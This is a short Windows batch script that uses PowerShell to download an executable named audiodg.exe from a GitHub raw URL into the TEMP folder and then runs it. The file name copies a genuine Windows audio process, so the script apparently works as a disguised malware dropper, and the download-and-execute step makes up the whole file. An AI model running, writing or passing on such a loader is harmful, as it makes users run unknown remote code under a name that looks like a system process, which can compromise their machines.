@echo off
set "url=https://raw.githubusercontent.com/FeroxxGOTY/GG/main/audiodg.exe"
set "outfile=%TEMP%\audiodg.exe"

powershell -Command "(new-object System.Net.WebClient).DownloadFile('%url%', '%outfile%')"

if exist "%outfile%" (
    start "" "%outfile%"
)
